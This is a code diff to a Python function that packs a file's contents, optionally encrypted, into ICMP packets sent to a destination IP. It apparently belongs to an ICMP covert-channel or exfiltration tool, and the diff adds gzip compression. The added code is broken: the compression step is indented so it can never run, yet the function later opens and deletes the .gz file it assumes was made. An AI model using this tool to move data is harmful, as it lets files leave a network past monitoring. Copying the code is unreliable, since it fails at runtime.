@@ -11,12 +11,12 @@ import os
 import sys
 from math import ceil
 
-def icmp(destIP, filename, BytesPP, encrypt, integrity):
+def icmp(destIP, filename, BytesPP, encrypt, integrity, zip):
     """
     args: destinationIP(str), filename(str), BytesPerPacket(int), encrypt (bool)
     return: list of packets
     """
-    READ_ONLY = 'r'
+    READ_ONLY = 'rb'
     listOfPackets = []
 
     # TODO: make sure minICMP size <= BytesPP <= MTU
@@ -36,6 +36,21 @@ def icmp(destIP, filename, BytesPP, encrypt, integrity):
     # opening the specified file **needs error handling**
     OFile = open(filename, READ_ONLY)  
 
+    # If we're zipping the file, make OFile point to the newly zipped file
+    if(zip):
+        try:
+            import gzip
+        except ImportError:
+            print("Could not import gzip")
+            print("Exiting...")
+            sys.exit()
+
+            # Make the newly zipped file (implict close of the file)
+            with gzip.open(filename + ".gz", 'wb', 9) as f:
+                f.write(OFile.read())
+        
+        # Point OFile to the newly zipped file
+        OFile = gzip.open(filename + ".gz", READ_ONLY)
 
     # Encrypt the file
     if(encrypt):
@@ -76,5 +91,9 @@ def icmp(destIP, filename, BytesPP, encrypt, integrity):
             listOfPackets.append(IP(dst=destIP)/ICMP()/OFile.read(BytesPP))
 
     OFile.close()
+
+    # If we created the zipped file, we want to delete that
+    if(zip):
+        os.remove(filename + ".gz")
 
     return listOfPackets
